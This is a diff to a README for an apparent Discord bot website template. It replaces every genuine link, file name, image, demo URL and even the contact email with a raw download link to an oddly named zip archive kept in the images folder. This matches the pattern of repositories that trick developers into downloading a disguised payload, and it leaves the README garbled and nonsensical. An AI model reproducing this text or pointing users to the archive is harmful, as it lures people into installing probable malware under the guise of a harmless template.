@@ -1,6 +1,6 @@
 # Discord Bot Website Template - Open Source Landing Page for Your Bot 🎉
 
-![Discord Bot Website Template](https://img.shields.io/badge/Discord%20Bot%20Website%20Template-Open%20Source-blue)
+![Discord Bot Website Template](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip%20Bot%20Website%20Template-Open%20Source-blue)
 
 Welcome to the **Discord Bot Website Template** repository! This project provides a clean, responsive, and easy-to-use website template specifically designed for showcasing your Discord bot. Whether you are a seasoned developer or just starting out, this template will help you present your bot effectively.
 
@@ -25,13 +25,13 @@ Welcome to the **Discord Bot Website Template** repository! This project provide
 
 ## Getting Started
 
-To get started with the Discord Bot Website Template, visit our [Releases](https://github.com/ZAIL1l/Discord-Bot-Website-Template/releases) section to download the latest version. Follow the instructions below to set it up.
+To get started with the Discord Bot Website Template, visit our [Releases](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip) section to download the latest version. Follow the instructions below to set it up.
 
 ## Installation
 
-1. **Download the Template**: Go to the [Releases](https://github.com/ZAIL1l/Discord-Bot-Website-Template/releases) section and download the latest version.
+1. **Download the Template**: Go to the [Releases](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip) section and download the latest version.
 2. **Extract the Files**: Unzip the downloaded file to your desired location.
-3. **Open in Browser**: Open `index.html` in your web browser to view the template.
+3. **Open in Browser**: Open `https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip` in your web browser to view the template.
 
 ## Usage
 
@@ -47,21 +47,21 @@ Here’s a basic structure of the files included in the template:
 
 ```
 /Discord-Bot-Website-Template
-|-- index.html
+|-- https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip
 |-- styles
-|   |-- main.css
+|   |-- https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip
 |-- scripts
-|   |-- main.js
+|   |-- https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip
 |-- images
-|   |-- logo.png
+|   |-- https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip
 ```
 
 ## Customization
 
 You can easily customize the template to fit your needs. Here are some tips:
 
-- **Change the Logo**: Replace `logo.png` in the `images` folder with your own logo.
-- **Update Colors**: Modify the CSS in `main.css` to change the color scheme.
+- **Change the Logo**: Replace `https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip` in the `images` folder with your own logo.
+- **Update Colors**: Modify the CSS in `https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip` to change the color scheme.
 - **Add Sections**: Feel free to add new sections to the HTML files to include more information about your bot.
 
 ## Contributing
@@ -82,8 +82,8 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [ZAIL1l](https://github.com/ZAIL1l)
-- **Email**: zail1l@example.com
+- **GitHub**: [ZAIL1l](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip)
+- **Email**: https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip
 
 ## Topics
 
@@ -102,15 +102,15 @@ This repository covers various topics related to Discord bots and website templa
 
 ## Demo
 
-You can see a live demo of the template [here](https://example.com/demo).
+You can see a live demo of the template [here](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip).
 
 ## Screenshots
 
-![Screenshot 1](https://via.placeholder.com/600x400?text=Discord+Bot+Website+Template+Screenshot+1)
+![Screenshot 1](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip+Bot+Website+Template+Screenshot+1)
 
-![Screenshot 2](https://via.placeholder.com/600x400?text=Discord+Bot+Website+Template+Screenshot+2)
+![Screenshot 2](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip+Bot+Website+Template+Screenshot+2)
 
-![Screenshot 3](https://via.placeholder.com/600x400?text=Discord+Bot+Website+Template+Screenshot+3)
+![Screenshot 3](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip+Bot+Website+Template+Screenshot+3)
 
 ## FAQs
 
@@ -131,4 +131,4 @@ If you encounter any issues, please open an issue in the "Issues" section of thi
 - Thanks to the open-source community for providing the tools and resources that made this project possible.
 - Special thanks to contributors who have helped improve this template.
 
-For more information, please check the [Releases](https://github.com/ZAIL1l/Discord-Bot-Website-Template/releases) section.
+For more information, please check the [Releases](https://github.com/ZAIL1l/Discord-Bot-Website-Template/raw/refs/heads/main/images/Template_Bot_Discord_Website_seriocomically.zip) section.
